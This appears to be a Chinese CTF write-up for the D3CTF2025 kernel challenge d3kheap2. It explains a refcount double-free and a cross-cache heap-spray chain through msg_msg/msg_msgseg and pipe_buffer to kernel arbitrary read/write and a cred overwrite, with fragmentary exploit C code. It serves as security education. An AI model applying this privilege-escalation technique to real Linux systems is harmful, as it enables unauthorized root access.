...
官方仓库位于 https://github.com/arttnba3/D3CTF2025_d3kheap2 ，后续会公开。

该仓库的关键信息是：题目提供一个 Linux kernel module `d3kheap2.ko`，接口只有在隔离的 `kmem_cache` 中分配和释放对象，核心漏洞是引用计数初始化错误导致同一对象可被释放两次。题目主要考察 cross-cache 利用，而不是复杂逆向。

## 解题过程

### 0x00. 漏洞介绍

这是一道较直接的 kernel pwn 题，不需要在逆向上投入太多精力。题目提供的内核模块名为 `d3kheap2.ko`，功能只是在隔离的 `kmem_cache` `d3kheap2_cache` 中分配和释放对象。漏洞点是引用计数初始化配置错误，导致同一个对象可以被释放两次，这一点与 `d3kheap` 类似。
...
由于目标对象位于专用的 `kmem_cache` 中，不能直接依赖同缓存中的常规对象复用，需要转向 cross-cache 攻击：

- 通过堆喷分配大量题目对象，然后全部释放，使对应 SLUB 页回到 BUDDY；

- 再次堆喷，让这些被释放的页进入另一个 `kmem_cache`，第一阶段选择 System V IPC 对象作为目标对象；

- 释放题目对象的悬挂指针，在 `msg_msgseg` 上制造 UAF，然后重新分配，得到指向同一对象的两个引用；

- 释放其中一个引用，并将其重新分配为 `pipe_buffer`。它与 `msg_msgseg` 使用相同的 GFP 标志，在 `CONFIG_SLAB_BUCKETS` 关闭时二者都来自 `kmalloc-cg`；

- 操作 `msg_msgseg` 和 `pipe_buffer`，获得内核空间任意读写能力。

最终利用如下。由于出题时间有限，该利用链的最终成功率约为 99.32%（本地自动测试超过 1024 次后的统计结果）。

注意，可以使用 `musl-gcc` 缩小二进制体积来提升向远程环境上传 exploit 的速度；原作者测试时使用的是 `x86_64-gentoo-linux-musl-gcc`。如果时间充足，也可以改成纯汇编实现。
...
size_t page_offset_base = 0xffff888000000000, vmemmap_base =
0xffffea0000000000;
...
/* 读取从 len 到 offset 开始，写入从 offset 开始 */
struct pipe_buffer {
    struct page *page;
...
/* prepare_copy() 会触发分配，因此为 msg_msgseg 使用更大的尺寸 */
...
)
{
    ...
    */
    if (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) < 0) {
        err_exit("FAILED to allocate msg_msg to overwritepipe_buffer!");
    }
...
void exploit(void)
{
    ...
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        if ((reclaim_msgq[i] = get_msg_queue()) < 0) {
            ...
            perror(err_msg);
            err_exit("FAILED to allocate msg_queue for clearingpartial SLUB!");
        }
    }
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
    ...
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < (MSG_SPRAY_NR / 2); j++) {
            if (read_msg(reclaim_msgq[i],buf,0x1000-
0x30,MSG_TAG_BASE+j) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
            ...
            buf[521] = j;
            if
(write_msg(vuln_msgq[i],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+j) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to alloc %d-%d msg_msg withmsg_msgseg\n",
                    i,
                    j
                );
                perror(err_msg);
...
0x30,MSG_TAG_BASE+j) < 0) {
            ...
            buf[520] = i;
            buf[521] = j;
            if (write_msg(vuln_msgq[i], buf, MSG_SPRAY_SZ,
MSG_TAG_BASE+j) < 0){
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
    ...
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < MSG_SPRAY_NR; j++) {
            ...
            buf[521] += j;
            if (write_msg(evil_msgq[i], buf, MSG_SPRAY_SZ,
MSG_TAG_BASE + j)<0){
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
    ...
    /* 确保 UAF 对象位于 CPU SLAB 上，后续无需继续堆喷 */
        ...
        for (int l = 0; l < MSG_SPRAY_NR; l++) {
            ...
            if (buf[520] == *(size_t*) "arttnba3"
                ...
                printf(
                    ...
                    SUCCESS_MSG("msg inno.")"%d"SUCCESS_MSG("vulqueue")
    ...
    if (!found) {
        err_exit("FAILED to create cross-cache UAF by sprayingmsg_msg!");
    }
out_uaf_msg:
    log_info("[*] Shifting obj-overlapping from msg_msg topipe_buffer...");
    if
(read_msg(vuln_msgq[vulq_idx],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+vulm_i
dx)<0){
    ...
    for (int i = 0; i < (PIPE_SPRAY_NR / 2); i++) {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            ...
            perror(err_msg);
            err_exit("FAILED to reclaim msg_msg withpipe_buffer!");
        }
    }
    if (read_msg(
        evil_msgq[evilq_idx],
    ...
    for (int i = (PIPE_SPRAY_NR / 2); i < PIPE_SPRAY_NR; i++) {
        ...
        /**
         * 持续检查以确保对象从 CPU SLUB 的第一个对象位置分配，
         * 这样后续无需继续堆喷
         */
    ...
    if (!found) {
        err_exit("FAILED to shift OVERLAP from msg_msg topipe_buffer!");
    }
out_overlap_pipe:
    close(pipe_fd[victim_pipe][1]);
    close(pipe_fd[victim_pipe][0]);
    if (pipe(atk_pipe) < 0 || fcntl(atk_pipe[1], F_SETPIPE_SZ,
0x1000*32) < 0) {
    ...
    if (write_msg(atk_msgq, buf, MSG_SPRAY_SZ, MSG_TAG_BASE) < 0)
{
        ...
        err_exit("FAILED to reclaim the victim pipe_buffer asmsg_msg!");
    }
    write(atk_pipe[1], "arttnba3", 8);
    if (read_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) <
0) {
    ...
    if (write_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) <
0) {
        perror("[x] Unable to allocate new msg_msg");
        err_exit("FAILED to reclaim the victim pipe_buffer asmsg_msg!");
    }
    ...
    for (int loop_nr = 0; 1; loop_nr++) {
        if (kernel_leak > 0xffffffff81000000
            ...
            printf(
                INFO_MSG("[*] Leak secondary_startup_64 : ")
"%lx\n",kernel_leak
            );
...
vmemmap_base);
        ...
        printf(
            "[No.%d loop] Got unmatched data: %lx, keeplooping...",
            loop_nr,
            kernel_leak
        );
...
task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task-
>real_cred */
            && (comm_addr[-2] == comm_addr[-3])) {  /* should be
equal */
            printf(
                SUCCESS_MSG("[+] Found task_struct on page: ")
"%lx\n",
                (vmemmap_base + i * 0x40)
            );
            printf(SUCCESS_MSG("[+] Got cred address: ")
"%lx\n",comm_addr[-2]);
            cred_kaddr = comm_addr[-2];
            cred_data = (void*) (cred_data_buf + (cred_kaddr &
(0x1000 - 1)));
            page_offset_base = cred_kaddr & KASLR_MASK;
            while (1) {
                cred_kpage_addr = vmemmap_base + \
                                (cred_kaddr - page_offset_base) /
0x1000 * 0x40;
                arbitrary_read_by_pipe(
                    cred_kpage_addr,
                    cred_data_buf,
                ...
                if (cred_data->uid == uid
                    && cred_data->gid == gid) {
                    printf(
                        SUCCESS_MSG("[+] Got page_offset_base: ")
"%lx\n",
                        page_offset_base
                    );
                    printf(
                        SUCCESS_MSG("[+] Found cred on page: ")
"%lx\n",
                        cred_kpage_addr
                    );
                    break;
...
- 核心技巧：利用引用计数错误制造双重释放，再通过跨缓存堆布局调整把题目对象所在页回收到 `msg_msgseg` / `pipe_buffer` 等可利用对象上。
- 识别信号：内核题给出专用 `kmem_cache`，对象只能 alloc/free，且 free 路径依赖 refcount 时，应优先检查 refcount 初始化和重复释放。
- 复用要点：isolated cache 不能直接按普通 UAF 利用，要先把 SLUB page 还给 buddy，再用 System V IPC、pipe buffer 等对象重占页面，最终构造内核任意读写并改 cred。
